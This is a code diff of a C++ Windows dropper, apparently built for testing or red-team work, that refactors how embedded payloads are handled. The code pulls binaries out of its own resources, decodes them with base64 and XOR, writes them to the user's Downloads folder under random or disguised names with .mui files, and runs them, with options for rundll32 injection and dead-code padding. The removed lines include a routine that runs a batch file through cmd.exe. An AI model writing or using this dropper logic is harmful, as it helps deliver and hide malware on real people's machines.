@@ -76,40 +76,29 @@ typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
 std::uint64_t os_version;
 HMODULE h;
 
-// 1 w11calc.exe (calculator for windows 11)
-// 2 payload.exe (copies the version of calculator onto github)
-// 3 payload.bat (copies calc.exe onto Downloads)
-// 4 7calc.exe (calculator for windows 7)
+// 1 w7_calc.exe
+// 2 w7_calc.exe.mui
+//32 w11_calc.exe (calculator for windows 11)
 
 std::wstring name1;
 std::wstring name2;
 std::wstring name3;
-std::wstring name4;
-std::wstring name5;
 
 HRSRC r1;
 HRSRC r2;
 HRSRC r3;
-HRSRC r4;
-HRSRC r5;
 
 HGLOBAL rc1;
 HGLOBAL rc2;
 HGLOBAL rc3;
-HGLOBAL rc4;
-HGLOBAL rc5;
 
 void* data1;
 void* data2;
 void* data3;
-void* data4;
-void* data5;
 
 DWORD size1;
 DWORD size2;
 DWORD size3;
-DWORD size4;
-DWORD size5;
 
 // Entry Point
 int main(int argc, char* argv[])
@@ -148,7 +137,6 @@ int main(int argc, char* argv[])
 	#endif
 
 	#if DROPPER_XOR_KEY != 0
-		printf("[%d]", DROPPER_XOR_KEY);
 		data1 = XOR(data1, size1);
 		data2 = XOR(data2, size2);
 	#endif
@@ -157,8 +145,6 @@ int main(int argc, char* argv[])
 		drop(size2, data2, name2);
 
 		exe_launch(name1);
-		printf("[%d]", GetLastError());
-
 
 #ifdef DEAD_CODE
 		// dead code
@@ -176,32 +162,19 @@ int main(int argc, char* argv[])
 
 	else if (os_version == 10) {
 
-		dropper_start(4);
-		dropper_start(5);
-//		dropper_start(1);
+		dropper_start(3);
 
 	#ifdef DROPPER_BASE64 == 1
-		data4 = base64decode(data4, &size4);
-		data5 = base64decode(data5, &size5);
-//		data1 = base64decode(data1, &size1);
-
+		data3 = base64decode(data3, &size3);
 	#endif
 
 	#if DROPPER_XOR_KEY != 0
-		data4 = XOR(data4, size4);
-		data5 = XOR(data5, size5);
-//		data1 = XOR(data1, size1);
+		data3 = XOR(data3, size3);
 	#endif
 
-		drop(size4, data4, name4);
-		drop(size5, data5, name5);
-//		drop(size1, data1, name1);
+		drop(size3, data3, name3);
 
-		wprintf(L"[%ls]", name4.c_str());
-		wprintf(L"[%ls]", name5.c_str());
-
-//		exe_launch(name1);
-		exe_launch(name4);
+		exe_launch(name3);
 
 	#ifdef DEAD_CODE
 		// dead code
@@ -242,20 +215,6 @@ void setup_name(std::uint64_t os_version) {
 		return;
 	}
 	else if (os_version == 6){
-#ifdef W7_EXTRACT
-
-		const wchar_t* temp = _wgetenv(L"USERPROFILE");
-		if (temp != nullptr){
-			name2 += temp;
-			name2 += L"\\Downloads";
-
-			name3 += temp;
-			name3 += L"\\Downloads";
-		} else {
-			printf("Problem with userprofile");
-		}
-
-#else
 
 		const wchar_t* temp = _wgetenv(L"USERPROFILE");
 		if (temp != nullptr){
@@ -269,20 +228,14 @@ void setup_name(std::uint64_t os_version) {
 			printf("Problem with userprofile");
 		}
 
-#endif
 	}
 	else if (os_version == 10){
 
 		const wchar_t* temp = _wgetenv(L"USERPROFILE");
 		if (temp != nullptr){
-			name1 += temp;
-			name1 += L"\\Downloads";
+			name3 += temp;
+			name3 += L"\\Downloads";
 
-			name4 += temp;
-			name4 += L"\\Downloads";
-			name5 += temp;
-			name5 += L"\\Downloads\\en-US";
-			CreateDirectoryW(name5.c_str(), NULL);
 		} else {
 			printf("Problem with userprofile");
 		}
@@ -298,50 +251,31 @@ void set_name(std::uint64_t os_version)
 	if (os_version == 0) {
 		std::cout << "Could not set name due to invalid OS\n";
 	}
-
 	else if (os_version == 6) {
 
-#ifdef W7_EXTRACT
 
-	int valid = 0;
-	#ifdef RANDOM_NAME
-		valid = 0;
+#ifdef RANDOM_NAME
+		int valid = 0;
 		srand(time(NULL));
 		while (valid < NAME_SIZE)
 		{
 			char c = rand();
 			if (c >= 'a' && c <= 'z')
 			{
-				name2.push_back(c);
+				name1.push_back(c);
 			}
 		}
-		valid = 0;
-		srand(time(NULL));
-		while (valid < NAME_SIZE)
-		{
-			char c = rand();
-			if (c >= 'a' && c <= 'z')
-			{
-				name3.push_back(c);
-			}
-		}
-	#else
-
-		name2+="\\file_get.exe";
-		name3+="\\file_move.bat";
-
-	#endif
+		name3 = name1 + L".mui";
 #else
 
-	const char* drop = DROPPER_OUTPUT;
-	int size = MultiByteToWideChar(CP_UTF8, 0, drop, -1, nullptr, 0);
-	std::wstring out(size-1, L'\0');
-	MultiByteToWideChar(CP_UTF8, 0, drop, -1, out.data(), size);
+		const char* drop = DROPPER_OUTPUT;
+		int size = MultiByteToWideChar(CP_UTF8, 0, drop, -1, nullptr, 0);
+		std::wstring out(size-1, L'\0');
+		MultiByteToWideChar(CP_UTF8, 0, drop, -1, out.data(), size);
 
-	name1+=out;
-	name2+=out;
-	name2+=L".mui";
-
+		name1+=out;
+		name2+=out;
+		name2+=L".mui";
 #endif
 	}
 
@@ -355,7 +289,7 @@ void set_name(std::uint64_t os_version)
 			char c = rand();
 			if (c >= 'a' && c <= 'z')
 			{
-				name1.push_back(c);
+				name3.push_back(c);
 			}
 		}
 #else
@@ -365,11 +299,7 @@ void set_name(std::uint64_t os_version)
 		std::wstring out(size-1, L'\0');
 		MultiByteToWideChar(CP_UTF8, 0, drop, -1, out.data(), size);
 
-		// name1+=out.c_str();
-		//name3+="\\file_move.bat";
-		name4+=out;
-		name5+=out;
-		name5+=L".mui";
+		name3+=out;
 
 #endif
 	}
@@ -381,91 +311,40 @@ void set_name(std::uint64_t os_version)
 }
 
 void dropper_start(int x){
-	if (x == 1){
-		// Locate Resource
-		r1 = FindResource(h, MAKEINTRESOURCE(IDR_BIN1), MAKEINTRESOURCE(BIN));
-		// Load Resource
-		rc1 = LoadResource(h, r1);
-		// Ensure nobody else will handle it
-		data1 = LockResource(rc1);
-		// Get embedded file size
-		size1 = SizeofResource(h, r1);
-	}
-	if (x == 2){
-		// Locate Resource
-		r2 = FindResource(h, MAKEINTRESOURCE(IDR_BIN2), MAKEINTRESOURCE(BIN));
-		// Load Resource
-		rc2 = LoadResource(h, r2);
-		// Ensure nobody else will handle it
-		data2 = LockResource(rc2);
-		// Get embedded file size
-		size2 = SizeofResource(h, r2);
-	}
-	if (x == 3){
-		r3 = FindResource(h, MAKEINTRESOURCE(IDR_BIN3), RT_RCDATA);
-		rc3 = LoadResource(h, r3);
-		// Ensure nobody else will handle it
-		data3 = LockResource(rc3);
-		// Get embedded file size
-		size3 = SizeofResource(h, r3);
-	}
-	if (x == 4){
-		//Locate Resource
-		r4 = FindResource(h, MAKEINTRESOURCE(IDR_BIN4), MAKEINTRESOURCE(BIN));
-		// Load Resource
-		rc4 = LoadResource(h, r4);
-		// Ensure nobody else will handle it
-		data4 = LockResource(rc4);
-		// Get embedded file size
-		size4 = SizeofResource(h, r4);
-	}
-	if (x == 5){
-		//Locate Resource
-		r5 = FindResource(h, MAKEINTRESOURCE(IDR_BIN5), MAKEINTRESOURCE(BIN));
-		// Load Resource
-		rc5 = LoadResource(h, r5);
-		// Ensure nobody else will handle it
-		data5 = LockResource(rc5);
-		// Get embedded file size
-		size5 = SizeofResource(h, r5);
+	switch(x) {
+		case 1:
+			// Locate Resource
+			r1 = FindResource(h, MAKEINTRESOURCE(IDR_BIN1), MAKEINTRESOURCE(BIN));
+			// Load Resource
+			rc1 = LoadResource(h, r1);
+			// Ensure nobody else will handle it
+			data1 = LockResource(rc1);
+			// Get embedded file size
+			size1 = SizeofResource(h, r1);
+			break;
+		case 2:
+			// Locate Resource
+			r2 = FindResource(h, MAKEINTRESOURCE(IDR_BIN2), MAKEINTRESOURCE(BIN));
+			// Load Resource
+			rc2 = LoadResource(h, r2);
+			// Ensure nobody else will handle it
+			data2 = LockResource(rc2);
+			// Get embedded file size
+			size2 = SizeofResource(h, r2);
+			break;
+		case 3:
+
+			r3 = FindResource(h, MAKEINTRESOURCE(IDR_BIN3), MAKEINTRESOURCE(BIN));
+			rc3 = LoadResource(h, r3);
+			// Ensure nobody else will handle it
+			data3 = LockResource(rc3);
+			// Get embedded file size
+			size3 = SizeofResource(h, r3);
+			break;
+		default:
+			std::cout << "cannot happen";
 	}
 
-}
-
-bool non_exe_launch(std::wstring name){
-	SHELLEXECUTEINFOW sei = {};
-	sei.cbSize = sizeof(sei);
-	sei.fMask = SEE_MASK_NOCLOSEPROCESS;
-	sei.hwnd = NULL;
-	sei.lpVerb = L"open";
-	sei.lpFile = L"C:\\Users\\Administrator\\Downloads\\file_move.bat";
-	sei.lpParameters = nullptr;
-	sei.lpDirectory = NULL;
-	sei.nShow = SW_SHOWNORMAL;
-
-	STARTUPINFOW si = {};
-	PROCESS_INFORMATION pi = {};
-	si.cb = sizeof(si);
-
-	BOOL result = CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", L"/c \"C:\\Users\\Administrator\\Downloads\\file_move.bat\"", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
-	if (result == true){
-		WaitForSingleObject(pi.hProcess, INFINITE);
-		CloseHandle(pi.hThread);
-		CloseHandle(pi.hProcess);
-		return true;
-	} else {
-		return false;
-	}
-
-//	BOOL result = ShellExecuteExW(&sei);
-//	if ( result == TRUE ){
-//	WaitForSingleObject(sei.hProcess, INFINITE);
-//		CloseHandle(sei.hProcess);
-//	}
-//	else {
-//		printf("this is error: %lu", GetLastError());
-//	}
-	std::cout << "This ran.\n";
 }
 
 // Launch a New Process based on the dropped file name
@@ -477,11 +356,6 @@ void exe_launch(std::wstring run_exe)
 	siw.cb = sizeof(siw);
 	ZeroMemory(&piw, sizeof(piw));
 
-	STARTUPINFOA sia;
-	PROCESS_INFORMATION pia;
-	ZeroMemory(&sia, sizeof(sia));
-	sia.cb = sizeof(sia);
-	ZeroMemory(&pia, sizeof(pia));
 	// build injection command
 #ifdef INJECT
 	char cmd[10 * NAME_SIZE] = "C:\\Windows\\system32\\rundll32.exe";
@@ -492,8 +366,6 @@ void exe_launch(std::wstring run_exe)
 #else
 	CreateProcessW( run_exe.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &siw, &piw);
 
-//	std::string cmdA = "C:\\Users\\Administrator\\Downloads\\exe_num28.exe";
-//	CreateProcessA( cmdA.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &sia, &pia);
 	return true;
 #endif
 }
